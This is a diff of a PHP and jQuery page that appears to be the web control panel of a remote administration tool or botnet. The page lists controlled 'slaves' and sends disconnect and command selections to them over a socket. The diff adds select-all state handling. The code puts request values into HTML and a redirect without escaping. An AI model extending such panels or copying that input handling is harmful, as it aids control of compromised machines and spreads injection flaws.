@@ -1,27 +1,30 @@
 <?php
 xdebug_disable();
 
-if (isset($_POST['id'])) {
-	echo $_POST['id'];
-}
-
 require_once "request.php";
 
 $request = new Request();
 $sock = $request->createSocket();
 
-if (isset($_POST ['select'])) {
-	if (isset($_POST ['disconnect'])) {
+if (isset($_POST['id'])) {
+	$selectedid = $_POST['id'];
+	
+	$request->write($sock, 5);
+	$request->write($sock, $selectedid);
+}
+
+if (isset($_POST['select'])) {
+	if (isset($_POST['disconnect'])) {
 		$request->write($sock, 10);
-		$request->write($sock, count($_POST ['select']));
-		foreach ( $_POST ['select'] as $slave ) {
+		$request->write($sock, count($_POST['select']));
+		foreach ($_POST['select'] as $slave) {
 			$request->write($sock, $slave);
 		}
 	}
 	
-	if (isset($_POST ['command'])) {
+	if (isset($_POST['command'])) {
 		$s;
-		foreach ( $_POST ['select'] as $slave ) {
+		foreach ($_POST['select'] as $slave) {
 			$s .= $slave . ",";
 		}
 		header("Location: commands.php?clients=" . $s);
@@ -48,7 +51,7 @@ require_once "layout/header.php";
 
 <script>
 $(document).ready(function() {
-    $('#selectall').click(function(event) {
+   /* $('#selectall').click(function(event) {
         if (this.checked) { 
             $('.box').each(function() {
                 this.checked = true;          
@@ -58,6 +61,17 @@ $(document).ready(function() {
                 this.checked = false;            
             });         
         }
+    });*/
+
+    $('#selectall').click(function(event) {
+    	$.post("clients.php",
+    			{
+        	    	id: this.checked ? "all" : "none",
+        	    },
+        	    function(data, status) {
+        		   	// alert("Data: " + data + "\nStatus: " + status);
+        	 	}
+        	);  
     });
 
     $('.box').click(function(event) {
@@ -143,12 +157,14 @@ $(document).ready(function() {
 					}
 					
 					for($i = $start; $i < $start + $max; $i ++) {
-						if (! isset($slaves [$i])) {
+						if (!isset($slaves[$i])) {
 							break;
 						}
-						$slave = $slaves [$i];
+						$slave = $slaves[$i];
 						
-						$displayed ++;
+						$displayed++;
+						
+						$checked = $slave->isSelected() === "true" ? "checked" : "";
 						
 						echo "<tr>\n";
 						echo printTableData($slave->getDisplayCountry());
@@ -158,7 +174,7 @@ $(document).ready(function() {
 						echo printTableData($slave->getVersion());
 						echo printTableData($slave->getPing());
 						echo printTableData("<a href='client.php?id=" . $slave->getUniqueId() . "'>Control Panel</a>");
-						echo printTableData("<input class='box' id='update' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
+						echo printTableData("<input class='box' id='update' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'" . $checked . ">");
 						echo "</tr>\n";
 					
 					}
